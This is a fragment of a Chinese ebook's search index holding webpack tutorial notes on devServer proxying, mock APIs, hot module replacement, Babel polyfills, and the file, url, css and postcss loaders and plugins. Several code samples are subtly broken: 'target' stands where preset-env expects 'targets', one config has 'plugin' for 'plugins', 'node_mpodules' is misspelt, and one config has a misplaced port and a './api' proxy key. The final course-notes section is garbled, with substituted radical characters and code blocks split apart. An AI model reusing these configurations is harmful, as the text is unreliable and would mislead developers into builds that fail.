8080 \u7aef\u53e3</p> <pre><code>{\n  devServer: {\n    contentBase: \"./dist\",\n    open: true,\n    proxy: {\n      \"/api\": {\n        target: \"http://localhost:8080\",\n      }\n    },\n    port: 8000,\n  }\n}\n</code></pre> <p>\u7136\u540e\u5728\u524d\u7aef js \u8bf7\u6c42\u4e2d\uff0c\u9700\u8981\u6539\u6210</p> <pre><code>import axios from \"axios\";\n\naxios.get(\"/api/comment\").then((res) =&gt; {\n  console.log(res);\n});\n</code></pre>"},{"location":"ebook-kaikeba-frontend/14-webpack-03/#mockserver","title":"mockServer","text":"<p>\u4e0a\u9762\u7684\u65b9\u6cd5\uff0c\u9700\u8981\u5199\u4e34\u65f6\u7684\u540e\u7aef\u4ee3\u7801\uff0c\u5de5\u4f5c\u91cf\u8f83\u5927\u3002\u5b9e\u9645\u53ef\u4ee5\u76f4\u63a5 mock \u670d\u52a1\u5668\uff0c\u4f7f\u7528 webpack \u94a9\u5b50</p> <pre><code>{\n  devServer: {\n    contentBase: \"./dist\",\n    open: true,\n    proxy: {\n      \"./api\": {\n        target: \"http://localhost:8080\",\n      }\n    },\n    before(app, server) {\n      app.get(\"api/comment\", (req, res) =&gt; {\n        res.json({ data: \"hello\" });\n      })\n    }\n  },\n  port: 8000,\n}\n</code></pre> <p>\u8fd9\u6837\u53d1\u51fa\u8bf7\u6c42\u540e\uff0c\u5728\u524d\u5904\u7406\u7684\u94a9\u5b50\u4e2d\uff0c\u76f4\u63a5\u628a\u8fd9\u4e2a\u8bf7\u6c42\u62e6\u622a\u5e76\u8fd4\u56de\u6570\u636e\uff0c\u5c31\u6a21\u62df\u4e86\u670d\u52a1\u5668\u3002</p>"},{"location":"ebook-kaikeba-frontend/14-webpack-03/#hmr","title":"HMR \u70ed\u6a21\u5757\u66ff\u6362","text":"<p>hot module replacement \u9996\u5148\u5728\u6d4f\u89c8\u5668\u4e2d\u70b9\u51fb\u4ea4\u4e92\uff0c\u66f4\u6539\u4ee3\u7801\u540e\uff0c\u6d4f\u89c8\u5668\u5237\u65b0\uff0c\u4f46\u662f\u5df2\u6709\u7684\u4ea4\u4e92\u4e0d\u6d88\u5931\uff0c\u76f4\u63a5\u6539\u53d8\u989c\u8272\u6216\u8005\u5185\u5bb9\uff1b\u5728\u8c03\u8282\u6837\u5f0f\u65f6\u5f88\u65b9\u4fbf\u3002</p> <p>\u914d\u7f6e\u6587\u4ef6\u5934\u90e8\u5f15\u5165 webpack\uff0c\u7136\u540e\u66f4\u6539\u914d\u7f6e\uff1a</p> <pre><code>const webpack = require('webpack');\n\n{\n  devServer: {\n    contentBase: \"./dist\",\n    open: true,\n    hot: true,\n    hotOnly: true, // \u5f00\u542f HMR\n  },\n  plugin: [\n    new CleanWebpackPlugin(),\n    new HtmlWebpackPlugin({\n      template: \"src/index.html\"\n    }),\n    new webpack.HotModuleReplacementPlugin(), // \u5f00\u542f HMR\n  ],\n}\n</code></pre>"},{"location":"ebook-kaikeba-frontend/14-webpack-03/#css-hmr","title":"CSS \u7684 HMR","text":"<p>MiniCssExtractPlugin \u5728\u5f00\u53d1\u9636\u6bb5\uff0c\u53ef\u80fd\u548c webpackDevServer \u7684 hot \u70ed\u542f\u52a8\u51b2\u7a81\u3002\u5f53\u66f4\u6539\u4e86\u6837\u5f0f\u540e\uff0c\u4e0d\u4f1a\u81ea\u52a8\u5237\u65b0\u754c\u9762\u4e2d\u7684\u989c\u8272\u3002\u6b64\u65f6\u628a\u8fd9\u4e2a mini \u53bb\u6389\uff0c\u6539\u6210\u9ed8\u8ba4\u7684 style-loader \u5373\u53ef\u5b9e\u73b0\u3002</p> <p>\u6ce8\u610f\uff1a</p> <ul> <li> <p>HMR\u70ed\u6a21\u5757\u66f4\u65b0\u7528\u4e8e\u5f00\u53d1\u73af\u5883\uff0c\u62bd\u53d6CSS\u63d2\u4ef6\u7528\u4e8e\u751f\u4ea7\u73af\u5883\uff0c\u8bbe\u7f6e\u4e0d\u540c\u7684 webpack \u914d\u7f6e\u3002</p> </li> <li> <p>HMR \u4e0d\u652f\u6301 chunkHash contentHash \uff08chunkHash \u7528\u4e8e JS \u6a21\u5757\u540d\u79f0\uff0ccontentHash \u7528\u4e8e css  \u6a21\u5757\u540d\u79f0\uff09</p> </li> </ul>"},{"location":"ebook-kaikeba-frontend/14-webpack-03/#js-hmr","title":"JS \u7684 HMR","text":"<p>\u539f\u7406\uff1a\u901a\u8fc7 module.hot.accept \u6765\u89c2\u5bdf\u6a21\u5757\u66f4\u65b0\uff0c\u7136\u540e\u76f4\u63a5\u66f4\u65b0\u8282\u70b9\uff08\u4e0b\u9762\u4ee3\u7801\u662f\u539f\u7406\uff09</p> <pre><code>import number from \"./number\";\nimport comment from \"./comment\";\n\n// \u5bfc\u5165\u4e24\u4e2a\u6a21\u5757\u5e76\u521d\u59cb\u5316\nnumber();\ncomment();\n\n// \u5982\u679c\u652f\u6301\u6a21\u5757\u66f4\u65b0\nif (module.hot) {\n  // \u5982\u679c\u89c2\u5bdf\u5230\u6a21\u5757\u66f4\u65b0\n  module.hot.accept('./b', function() {\n    document.body.removeChild(document.getElementById(\"number\"));\n    number();\n  });\n}\n</code></pre> <p>\u5b9e\u9645\u4f7f\u7528 loader \u5b9e\u73b0 JS \u7684 HMR\uff08React hot loader, Vue loader\uff09\uff0c\u4e0d\u9700\u8981\u81ea\u5df1\u624b\u5199 JS HMR</p>"},{"location":"ebook-kaikeba-frontend/14-webpack-03/#es6","title":"ES6 \u5904\u7406","text":""},{"location":"ebook-kaikeba-frontend/14-webpack-03/#babel","title":"babel","text":"<p>babel \u662f JS \u7684\u7f16\u8bd1\u5668\uff08\u8bed\u6cd5\u8f6c\u6362\u5668\uff09</p> <p>Babel \u5904\u7406 ES6\uff08\u6700\u65b0\u7248\u672c\u662f 7.15\uff0c\u4e00\u5207\u4ee5\u6700\u65b0\u7248\u672c\u4e3a\u51c6\uff0chttps://babeljs.io/\uff09</p> <pre><code>npm install -D @babel/core @babel/preset-env\n</code></pre> <p>\u53ef\u4ee5\u76f4\u63a5\u5728 webpack.config.js \u4e2d\u8bbe\u7f6e <pre><code>{\n  module: {\n    rules: [\n      {\n        test: /\\.jsx?$/,\n        exclude: /node_modules/,\n        loader: \"babel-loader\"\n      },\n    ]\n  }\n}\n</code></pre></p>"},{"location":"ebook-kaikeba-frontend/14-webpack-03/#pollyfill","title":"pollyfill","text":"<p>\u95ee\u9898\uff1aBabel \u53ef\u4ee5\u8f6c\u6362\u7bad\u5934\u51fd\u6570\uff0c\u4f46\u65e0\u6cd5\u8f6c\u6362 Promise\uff0c\u9700\u8981\u4f7f\u7528\u57ab\u7247 polyfill \uff08ES6+\u7684\u89c4\u8303\u5e93\uff09</p> <p>polyfill \u4e0d\u4f1a\u8f6c\u6362\u8bed\u6cd5\uff0c\u53ea\u662f\u52a0\u4e00\u4e2a\u57ab\u7247\uff08\u6ca1\u6709 Promise \u5c31\u5728\u524d\u9762\u9884\u8bbe\u4e00\u4e2a\u51fd\u6570\uff09\u8f6c\u6362\u529f\u80fd\u662f @babel/core \u4e2d\u7684\u90e8\u5206</p> <p>\u57ab\u7247\uff08polyfill\uff09\u4e0d\u662f\u7f16\u8bd1\u5668\uff0c\u4e0d\u4f1a\u66f4\u6539\u4ee3\u7801\uff1b\u5c31\u662f\u5728\u7f16\u8bd1\u524d\u5b9a\u4e49\u4e00\u4e2a Promise \u7ed1\u5b9a\u5728 window \u4e0a\u3002\u4f18\u70b9\u53ef\u4ee5\u652f\u6301\u4e0d\u540c\u7684\u8bed\u6cd5\uff0c\u9002\u5408\u5b9e\u9645\u751f\u4ea7\u9879\u76ee\uff1b\u7f3a\u70b9\uff1a\u4f1a\u6c61\u67d3\u5168\u5c40\u73af\u5883\uff0c\u4e0d\u9002\u5408\u5728\u7ec4\u4ef6\u5e93\u4e2d\u4f7f\u7528\u3002</p> <p>\u7ec4\u4ef6\u5e93\u53ef\u4ee5\u4f7f\u7528 @babel/plugin-transform-runtime \u95ed\u5305\u5f62\u5f0f\uff0c\u4e0d\u4f1a\u6c61\u67d3\u5168\u5c40\u73af\u5883\uff08\u5177\u4f53\u53c2\u8003\u5b98\u7f51\uff09</p> <pre><code>npm install --save-dev @babel/plugin-transform-runtime\nnpm install --save @babel/runtime\n</code></pre> <p>\u57ab\u7247\u5982\u679c\u5168\u90e8\u4f7f\u7528\uff0c\u652f\u6301\u7684\u8bed\u6cd5\u8f83\u591a\uff0c\u90a3\u4e48\u4f1a\u5927\u5927\u589e\u52a0\u6253\u5305\u540e\u7684\u5927\u5c0f\uff0c\u6240\u4ee5\u9700\u8981\u6309\u9700\u52a0\u8f7d\u3002</p>"},{"location":"ebook-kaikeba-frontend/14-webpack-03/#_2","title":"\u6309\u9700\u52a0\u8f7d","text":"<p>tip\uff1aVS code \u4e2d\uff0cctrl + shift + O \u67e5\u627e\u51fd\u6570\u540d</p> <p>\u6309\u9700\u52a0\u8f7d\u540e\u7684\u914d\u7f6e</p> <pre><code>{\n  test: /\\.js$/,\n  exclude: /node_mpodules/,\n  use: {\n    loader: \"babel-loader\",\n    options: {\n      presets: [\n        [\n          \"@babel/preset-env\",\n          {\n            target: {\n              edge: \"17\",\n              firefox: \"60\",\n              chrome: \"67\",\n              safari: \"11.1\"\n            },\n            corejs: 2, // \u65b0\u7248\u672c\u9700\u8981\u6307\u5b9a\u6838\u5fc3\u5e93\u7248\u672c\n            useBuiltIns: \"usage\", // \u6309\u9700\u52a0\u8f7d polyfill\n          }\n        ]\n      ], \n    }\n  }\n}\n</code></pre> <p>useBuiltIns \u53ef\u4ee5\u652f\u6301 \"usage\" \"entry\" \"false\" \u4e09\u4e2a\u5c5e\u6027</p> <p>\u201dusage\" \u4e0d\u9700\u8981\u5728\u6587\u4ef6\u4e2d import\uff0c\u9700\u8981\u624b\u52a8\u5b89\u88c5 \"@babel/polyfill\"</p> <p>\u4e5f\u53ef\u4ee5\u5355\u72ec\u5199\u5728 .babelrc \u4e2d</p> <pre><code>{\n  presets: [\n    [\n      \"@babel/preset-env\",\n      {\n        target: {\n          edge: \"17\",\n          firefox: \"60\",\n          chrome: \"67\",\n          safari: \"11.1\"\n        },\n        corejs: 2, // \u65b0\u7248\u672c\u9700\u8981\u6307\u5b9a\u6838\u5fc3\u5e93\u7248\u672c\n        useBuiltIns: \"usage\", // \u6309\u9700\u52a0\u8f7d polyfill\n      }\n    ]\n  ]\n}\n</code></pre> <p>Babel \u4e2d\u7684 stage-0 stage-2 \u7b49\u5df2\u7ecf\u8fc7\u65f6\u4e86\uff0c\u73b0\u5728\u76f4\u63a5\u4f7f\u7528 @babel/preset-env \u5373\u53ef</p> <p>\u5176\u4ed6\u7684\u6559\u7a0b\u6216\u8005\u9879\u76ee\u9700\u8981\u6ce8\u610f\u7248\u672c</p>"},{"location":"ebook-kaikeba-frontend/14-webpack-03/#react","title":"\u914d\u7f6e react \u6253\u5305\u73af\u5883","text":"<pre><code>npm install react react-dom --save\n</code></pre> <p>\u4f7f\u7528 @babel/preset-react\uff0c\u5728 babelrc \u4e2d</p> <pre><code>{\n  presets: [\n    [\n      \"@babel/preset-env\",\n      {\n        target: {\n          edge: \"17\",\n          firefox: \"60\",\n          chrome: \"67\",\n          safari: \"11.1\"\n        },\n        corejs: 2, // \u65b0\u7248\u672c\u9700\u8981\u6307\u5b9a\u6838\u5fc3\u5e93\u7248\u672c\n        useBuiltIns: \"usage\", // \u6309\u9700\u52a0\u8f7d polyfill\n      }\n    ],\n    \"@babel/preset-react\"\n  ]\n}\n</code></pre> <p>\u6ce8\uff1a\u4ee5\u4e0a\u914d\u7f6e\u9002\u5e94\u4e8e 7 \u7248\u672c\uff1b\u4e0d\u9002\u7528\u4e8e 6 \u7248\u672c</p>"},{"location":"ebook-kaikeba-frontend/14-webpack-03/#_3","title":"\u539f\u59cb\u8bfe\u7a0b\u7b14\u8bb0","text":"<p>\u4f5c\u4e1a:</p> <p>webpack\u2f40\u652f\u6301\u7b2c\u4e09\u2f45\u65b9\u5b57\u4f53 \u7b2c\u2f06\u4e2a\u4f5c\u4e1a\uff0c\u5b9e\u73b0vue\u5f00\u53d1\u73af\u5883\u7684\u914d\u7f6e</p> <p>loader: file-loader:\u5904\u7406\uf9e4\u9759\u6001\u8d44\u6e90\u6a21\u5757  loader: file-loader \u539f\u7406\uf9e4\u662f\u628a\u6253\u5305\u2f0a\u53e3\u4e2d\u8bc6\u522b\u51fa\u7684\u8d44\u6e90\u6a21\u5757\uff0c\u79fb\u52a8\u5230\u8f93\u51fa\u2f6c\u76ee\u5f55\uff0c\u5e76\u4e14\u8fd4\u56de\u2f00\u4e2a\u5730\u5740\u540d\u79f0</p> <p>\u6240\u4ee5\u6211\u4eec\u4ec0\uf9fd\u4e48\u65f6\u5019\u2f64file-loader\u5462? \u573a\u666f:\u5c31\u662f\u5f53\u6211\u4eec\u9700\u8981\u6a21\u5757\uff0c\u4ec5\u4ec5\u662f\u4ece\u6e90\u4ee3\u7801\u632a\u79fb\u5230\u6253\u5305\u2f6c\u76ee\u5f55\uff0c\u5c31\u53ef\u4ee5\u4f7f\u2f64file-loader\u6765\u5904\u7406\uf9e4\uff0c</p> <p>txt\uff0csvg\uff0ccsv\uff0cexcel\uff0c\u56fe\u2f5a\u7247\u8d44\u6e90\u5566\u7b49\u7b49 npm install file-loader -D</p> <p>\u6848\u4f8b:</p> <pre><code>module: {\n    rules: [\n\n\n{\n test: /\\.(png|jpe?g|gif)$/, //use\u4f7f\u2f64\u2f00\u4e2aloader\u53ef\u4ee5\u2f64\u5bf9\u8c61\uff0c\u5b57\u7b26\u4e32\uf905\uff0c\u4e24\u4e2aloader\u9700\u8981\u2f64\u6570\u7ec4\n\n\n\nuse: {\n loader: \"file-loader\",\n // options\u989d\u5916\u7684\u914d\u7f6e\uff0c\u2f50\u6bd4\u5982\u8d44\u6e90\u540d\u79f0 options: {\n\n// placeholder \u5360\u4f4d\u7b26 [name]\u2f7c\u8001\uf934\u8d44\u6e90\u6a21\u5757\u7684\u540d\u79f0\n // [ext]\u2f7c\u8001\uf934\u8d44\u6e90\u6a21\u5757\u7684\u540e\u7f00\n // https://webpack.js.org/loaders/file-loader#placeholders name: \"[name]_[hash].[ext]\",\n //\u6253\u5305\u540e\u7684\u5b58\u653e\u4f4d\u7f6e\n outputPath: \"images/\"\n\n} }\n\n} ]\n\n},\n</code></pre> <pre><code>import pic from \"./logo.png\";\nvar img = new Image();\nimg.src = pic;\nimg.classList.add(\"logo\");\nvar root = document.getElementById(\"root\");\nroot.append(img);\n</code></pre> <p>\u5904\u7406\uf9e4\u5b57\u4f53 https://www.iconfont.cn/?spm=a313x.7781069.1998910419.d4d0a486a</p> <pre><code>//css\n@font-face {\n  font-family: \"webfont\";\n  font-display: swap;\n  src: url(\"webfont.woff2\") format(\"woff2\");\n}\n\nbody {\n  background: blue;\n  font-family: \"webfont\" !important;\n}\n</code></pre> <pre><code>//webpack.config.js\n{\n  test: /\\.(eot|ttf|woff|woff2|svg)$/,\n  use: \"file-loader\"\n}\n</code></pre>"},{"location":"ebook-kaikeba-frontend/14-webpack-03/#url-loader-file-loader","title":"url-loader file-loader\u52a0\u5f3a\u7248\u672c","text":"<p>url-loader\u5185\u90e8\u4f7f\u2f64\u4e86\uf9bafile-loader,\u6240\u4ee5\u53ef\u4ee5\u5904\u7406\uf9e4file-loader\u6240\u6709\u7684\u4e8b\u60c5\uff0c\u4f46\u662f\u9047\u5230jpg\u683c\u5f0f\u7684\u6a21\u5757\uff0c \u4f1a\u628a\u8be5\u56fe\u2f5a\u7247\u8f6c\u6362\u6210base64\u683c\u5f0f\u5b57\u7b26\u4e32\uf905\uff0c\u5e76\u6253\u5305\u5230js\u2fa5\u91cc\uf9e9\u3002\u5bf9\u2f29\u5c0f\u4f53\u79ef\u7684\u56fe\u2f5a\u7247\u2f50\u6bd4\u8f83\u5408\u9002\uff0c\u2f24\u5927\u56fe\u2f5a\u7247\u4e0d\uf967\u5408 \u9002\u3002</p> <pre><code>  npm install url-loader -D\n</code></pre> <p>\u6848\u4f8b;</p> <p>\u6837\u5f0f\u5904\u7406\uf9e4:</p> <p>Css-loader \u5206\u6790css\u6a21\u5757\u4e4b\u95f4\u7684\u5173\u7cfb\uff0c\u5e76\u5408\u6210\u2f00\u4e2acss  Style-loader \u4f1a\u628acss-loader\u2f63\u6210\u7684\u5185\u5bb9\uff0c\u4ee5style\u6302\u8f7d\u5230\u2eda\u9875\u2faf\u9762\u7684heade\u90e8\u5206</p> <pre><code>  npm install style-loader css-loader -D\nmodule: {\n    rules: [\n      {\n        test: /\\.(png|jpe?g|gif)$/,\n        use: {\n          loader: \"url-loader\",\n          options: {\n</code></pre> <p>name: \"[name]_[hash].[ext]\", outputPath: \"images/\", //\u2f29\u5c0f\u4e8e2048\uff0c\u624d\u8f6c\u6362\u6210base64 limit: 2048</p> <p>} }</p> <p>} ]</p> <p>},</p> <pre><code>{\n  test: /\\.css$/,\n  use: [\"style-loader\", \"css-loader\"]\n</code></pre> <p>}</p> <pre><code>{\n  test:/\\.css$/,\n    use:[{\n      loader:\"style-loader\",\n      options: {\n</code></pre> <p>injectType: \"singletonStyleTag\" // \u5c06\u6240\u6709\u7684style\u6807\u7b7e\u5408\u5e76\u6210\u2f00\u4e2a }</p> <pre><code>    },\"css-loader\"]\n}\n</code></pre> <p>Less\u6837\u5f0f\u5904\u7406\uf9e4  less-load \u628aless\u8bed\u6cd5\u8f6c\u6362\u6210css</p> <pre><code>  $ npm install less less-loader --save-dev\n</code></pre> <p>\u6848\u4f8b: loader\u6709\u987a\u5e8f\uff0c\u4ece\u53f3\u5230\u5de6\uff0c\u4ece\u4e0b\u5230\u4e0a</p> <p>\u6837\u5f0f\u2f83\u81ea\u52a8\u6dfb\u52a0\u524d\u7f00:</p> <p>https://caniuse.com/</p> <p>Postcss-loader</p> <pre><code>  npm i  postcss-loader autoprefixer -D\n</code></pre> <p>\u65b0\u5efapostcss.config.js //webpack.config.js</p> <pre><code>{\n  test: /\\.scss$/,\n  use: [\"style-loader\", \"css-loader\", \"less-loader\"]\n</code></pre> <p>}</p> <pre><code>{\n  test: /\\.css$/,\n  use: [\"style-loader\", \"css-loader\", \"postcss-loader\"]\n</code></pre> <p>},</p> <pre><code>//postcss.config.js\nmodule.exports = {\n  plugins: [\n    require(\"autoprefixer\")({\n      overrideBrowserslist: [\"last 2 versions\", \"&gt;1%\"]\n</code></pre> <p>}) ]</p> <p>};</p> <p>loader \u5904\u7406\uf9e4webpack\u4e0d\uf967\u2f40\u652f\u6301\u7684\u683c\u5f0f\u2f42\u6587\u4ef6\uff0c\u6a21\u5757 \u2f00\u4e2aloader\u53ea\u5904\u7406\uf9e4\u2f00\u4ef6\u4e8b\u60c5  loader\u6709\u6267\u2f8f\u884c\ufa08\u987a\u5e8f</p> <p>5.Plugins</p> <p>\u4f5c\u2f64\u4e8ewebpack\u6253\u5305\u6574\u4e2a\u8fc7\u7a0b webpack\u7684\u6253\u5305\u8fc7\u7a0b\u662f\u6709(\u2f63\u547d\u5468\u671f\u6982\u5ff5)\u94a9\u2f26\u5b50</p> <p>plugin \u53ef\u4ee5\u5728webpack\u8fd0\u2f8f\u884c\ufa08\u5230\u67d0\u4e2a\u9636\u6bb5\u7684\u65f6\u5019\uff0c\u5e2e\u4f60\u505a\u2f00\u4e9b\u4e8b\u60c5\uff0c\u7c7b\u4f3c\u4e8e\u2f63\u547d\u5468\u671f\u7684\u6982\u5ff5 \u6269\u5c55\u63d2\u4ef6\uff0c\u5728 Webpack \u6784\u5efa\u6d41\u7a0b\u4e2d\u7684\u7279\u5b9a\u65f6\u673a\u6ce8\u2f0a\u6269\u5c55\u903b\u8f91\u6765\u6539\u53d8\u6784\u5efa\u7ed3\u679c\u6216\u505a\u4f60\u60f3\u8981\u7684\u4e8b\u60c5\u3002 \u4f5c\u2f64\u4e8e\u6574\u4e2a\u6784\u5efa\u8fc7\u7a0b</p> <p>HtmlWebpackPlugin</p> <p>htmlwebpackplugin\u4f1a\u5728\u6253\u5305\u7ed3\u675f\u540e\uff0c\u2f83\u81ea\u52a8\u2f63\u6210\u2f00\u4e2ahtml\u2f42\u6587\u4ef6\uff0c\u5e76\u628a\u6253\u5305\u2f63\u6210\u7684js\u6a21\u5757\u5f15\u2f0a\u5230\u8be5html \u4e2d\u3002</p> <pre><code>  npm install --save-dev html-webpack-plugin\n</code></pre> <p>\u914d\u7f6e:</p> <p>title: \u2f64\u6765\u2f63\u6210\u2eda\u9875\u2faf\u9762\u7684 title \u5143\u7d20  filename: \u8f93\u51fa\u7684 HTML \u2f42\u6587\u4ef6\u540d\uff0c\u9ed8\u8ba4\u662f index.html, \u4e5f\u53ef\u4ee5\u76f4\u63a5\u914d\u7f6e\u5e26\u6709\u2f26\u5b50\u2f6c\u76ee\u5f55\u3002  template: \u6a21\u677f\u2f42\u6587\u4ef6\u8def\uf937\u5f84\uff0c\u2f40\u652f\u6301\u52a0\u8f7d\u5668\ufa38\uff0c\u2f50\u6bd4\u5982 html!./index.html  inject: true | 'head' | 'body' | false ,\u6ce8\u2f0a\u6240\u6709\u7684\u8d44\u6e90\u5230\u7279\u5b9a\u7684 template \u6216\u8005 templateContent \u4e2d\uff0c\u5982\u679c\u8bbe\u7f6e\u4e3a true \u6216\u8005 body\uff0c\u6240\u6709\u7684 javascript \u8d44\u6e90\u5c06\u88ab\u653e\u7f6e\u5230 body \u5143\u7d20\u7684\u5e95\u90e8\uff0c'head' \u5c06\u653e\u7f6e\u5230 head \u5143\u7d20\u4e2d\u3002  favicon: \u6dfb\u52a0\u7279\u5b9a\u7684 favicon \u8def\uf937\u5f84\u5230\u8f93\u51fa\u7684 HTML \u2f42\u6587\u4ef6\u4e2d\u3002  minify: {} | false , \u4f20\u9012 html-minifier \u9009\u9879\u7ed9 minify \u8f93\u51fa  hash: true | false, \u5982\u679c\u4e3a true, \u5c06\u6dfb\u52a0\u2f00\u4e2a\u552f\u2f00\u7684 webpack \u7f16\u8bd1 hash \u5230\u6240\u6709\u5305\u542b\u7684\u811a\u672c\u548c CSS \u2f42\u6587\u4ef6\uff0c\u5bf9\u4e8e\u89e3\u9664 cache \u5f88\u6709\u2f64\u3002  cache: true | false\uff0c\u5982\u679c\u4e3a true, \u8fd9\u662f\u9ed8\u8ba4\u503c\uff0c\u4ec5\u4ec5\u5728\u2f42\u6587\u4ef6\u4fee\u6539\u4e4b\u540e\u624d\u4f1a\u53d1\u5e03\u2f42\u6587\u4ef6\u3002 showErrors: true | false, \u5982\u679c\u4e3a true, \u8fd9\u662f\u9ed8\u8ba4\u503c\uff0c\u9519\u8bef\u4fe1\u606f\u4f1a\u5199\u2f0a\u5230 HTML \u2eda\u9875\u2faf\u9762\u4e2d chunks: \u5141\u8bb8\u53ea\u6dfb\u52a0\u67d0\u4e9b\u5757 (\u2f50\u6bd4\u5982\uff0c\u4ec5\u4ec5 unit test \u5757)  chunksSortMode: \u5141\u8bb8\u63a7\u5236\u5757\u5728\u6dfb\u52a0\u5230\u2eda\u9875\u2faf\u9762\u4e4b\u524d\u7684\u6392\u5e8f\u2f45\u65b9\u5f0f\uff0c\u2f40\u652f\u6301\u7684\u503c:'none' | 'default' | {function}-default:'auto'  excludeChunks: \u5141\u8bb8\u8df3\u8fc7\u67d0\u4e9b\u5757\uff0c(\u2f50\u6bd4\u5982\uff0c\u8df3\u8fc7\u5355\u5143\u6d4b\u8bd5\u7684\u5757)</p> <p>\u6848\u4f8b:</p> <pre><code>const path = require(\"path\");\nconst htmlWebpackPlugin = require(\"html-webpack-plugin\");\nmodule.exports = {\n ...\n  plugins: [\n    new htmlWebpackPlugin({\n      title: \"My App\",\n      filename: \"app.html\",\n      template: \"./src/index.html\"\n</code></pre> <p>}) ]</p> <p>};</p> <pre><code>//index.html\n&lt;!DOCTYPE html&gt;\n&lt;html lang=\"en\"&gt;\n  &lt;head&gt;\n    &lt;meta charset=\"UTF-8\" /&gt;\n    &lt;meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\" /&gt;\n    &lt;meta http-equiv=\"X-UA-Compatible\" content=\"ie=edge\" /&gt;\n    &lt;title&gt;&lt;%= htmlWebpackPlugin.options.title %&gt;&lt;/title&gt;\n  &lt;/head&gt;\n  &lt;body&gt;\n&lt;div id=\"root\"&gt;&lt;/div&gt;\n</code></pre> <pre><code>  &lt;/body&gt;\n&lt;/html&gt;\n</code></pre> <p>clean-webpack-plugin</p> <pre><code>  npm install --save-dev clean-webpack-plugin\nconst { CleanWebpackPlugin } = require(\"clean-webpack-plugin\");\n</code></pre> <p>...</p> <pre><code>plugins: [\n    new CleanWebpackPlugin()\n</code></pre> <p>]</p> <p>mini-css-extract-plugin</p> <pre><code>const MiniCssExtractPlugin = require(\"mini-css-extract-plugin\");\n{\n  test: /\\.css$/,\n  use: [MiniCssExtractPlugin.loader, \"css-loader\"]\n</code></pre> <p>}</p> <p>})</p> <pre><code>new MiniCssExtractPlugin({\n  filename: \"[name][chunkhash:8].css\"\n</code></pre> <p>chunk:\u2f00\u4e2a\u2f0a\u53e3\u80af\u5b9a\u662f\u2f00\u4e2achunk\uff0c\u4f46\u662f\u2f00\u4e2achunk\u4e0d\uf967\u2f00\u5b9a\u53ea\u6709\u2f00\u4e2a\u4f9d\u8d56 </p> <p>webpack5.x \u51cf\u5c11hash\u7684\u6982\u5ff5 Contenthash</p> <p>6.sourceMap</p> <p>\u6e90\u4ee3\u7801\u4e0e\u6253\u5305\u540e\u7684\u4ee3\u7801\u7684\u6620\u5c04\u5173\u7cfb\uff0c\u901a\u8fc7sourceMap\u5b9a\u4f4d\u5230\u6e90\u4ee3\u7801\u3002 \u5728dev\u6a21\u5f0f\u4e2d\uff0c\u9ed8\u8ba4\u5f00\u542f\uff0c\u5173\u95ed\u7684\u8bdd \u53ef\u4ee5\u5728\u914d\u7f6e\u2f42\u6587\u4ef6\u2fa5\u91cc\uf9e9</p> <pre><code>  devtool:\"none\"\n</code></pre> <p>devtool\u7684\u4ecb\u7ecd:https://webpack.js.org/configuration/devtool#devtool eval:\u901f\u5ea6\u6700\u5feb,\u4f7f\u2f64eval\u5305\u88f9\u6a21\u5757\u4ee3\u7801,  source-map: \u4ea7\u2f63 .map \u2f42\u6587\u4ef6  cheap:\u8f83\u5feb\uff0c\u4e0d\uf967\u5305\u542b\u5217\uf99c\u4fe1\u606f  Module:\u7b2c\u4e09\u2f45\u65b9\u6a21\u5757\uff0c\u5305\u542bloader\u7684sourcemap(\u2f50\u6bd4\u5982jsx to js \uff0cbabel\u7684sourcemap) inline: \u5c06 .map \u4f5c\u4e3aDataURI\u5d4c\u2f0a\uff0c\u4e0d\uf967\u5355\u72ec\u2f63\u6210 .map \u2f42\u6587\u4ef6</p> <p>\u914d\u7f6e\u63a8\u8350:</p> <p>WebpackDevServer</p> <p>\u63d0\u5347\u5f00\u53d1\u6548\u7387\u7684\u5229\uf9dd\u5668\ufa38 \u6bcf\u6b21\u6539\u5b8c\u4ee3\u7801\u90fd\u9700\u8981\u91cd\u65b0\u6253\u5305\u2f00\u6b21\uff0c\u6253\u5f00\u6d4f\u89c8\u5668\ufa38\uff0c\u5237\u65b0\u2f00\u6b21\uff0c\u5f88\u9ebb\u70e6,\u6211\u4eec\u53ef\u4ee5\u5b89\u88c5\u4f7f\u2f64</p> <p>webpackdevserver\u6765\u6539\u5584\u8fd9\u5757\u7684\u4f53\u9a8c \u5b89\u88c5</p> <pre><code>   npm install webpack-dev-server -D\n</code></pre> <p>\u914d\u7f6e \u4fee\u6539\u4e0bpackage.json</p> <p>devtool:\"cheap-module-eval-source-map\",// \u5f00\u53d1\u73af\u5883\u914d\u7f6e</p> <p>//\u7ebf\u4e0a\u4e0d\uf967\u63a8\u8350\u5f00\u542f  devtool:\"cheap-module-source-map\", // \u7ebf\u4e0a\u2f63\u6210\u914d\u7f6e</p> <pre><code>\"scripts\": {\n    \"server\": \"webpack-dev-server\"\n</code></pre> <p>},</p> <p>\u5728webpack.config.js\u914d\u7f6e:</p> <p>\u542f\u52a8</p> <pre><code>  npm run server\n</code></pre> <p>\u542f\u52a8\u670d\u52a1\u540e\uff0c\u4f1a\u53d1\u73b0dist\u2f6c\u76ee\u5f55\u6ca1\u6709\u4e86\uf9ba\uff0c\u8fd9\u662f\u56e0\u4e3adevServer\u628a\u6253\u5305\u540e\u7684\u6a21\u5757\u4e0d\uf967\u4f1a\u653e\u5728dist\u2f6c\u76ee\u5f55\u4e0b\uff0c\u2f7d\u800c\u662f\u653e \u5230\u5185\u5b58\u4e2d\uff0c\u4ece\u2f7d\u800c\u63d0\u5347\u901f\u5ea6</p> <p>\u672c\u5730mock,\u89e3\u51b3\u8de8\u57df: \u524d\u540e\u7aef\u5206\u79bb</p> <p>\u524d\u7aef\u548c\u540e\u7aef\u662f\u53ef\u4ee5\u5e76\u2f8f\u884c\ufa08\u5f00\u53d1\u7684\uff0c  \u524d\u7aef\u4f1a\u4f9d\u8d56\u540e\u7aef\u7684\u63a5\u2f1d\u53e3 \u5148\u7ed9\u63a5\u2f1d\u53e3\u2f42\u6587\u6863\uff0c\u548c\u63a5\u2f1d\u53e3\u8054\u8c03\u2f47\u65e5\u671f\u7684 \u6211\u4eec\u524d\u7aef\u5c31\u53ef\u4ee5\u672c\u5730mock\u6570\u636e\uff0c\u4e0d\uf967\u6253\u65ad\u2f83\u81ea\u2f30\u5df1\u7684\u5f00\u53d1\u8282\u594f</p> <p>\u5f00\u53d1y\u2f00\u4e2a\u9879\u2f6c\u76ee \u8fdb\u2f0a\u2f00\u4e2a\u9879\u2f6c\u76ee\u7ec4 \u8bc4\u5ba1\u4f1a\u8bae  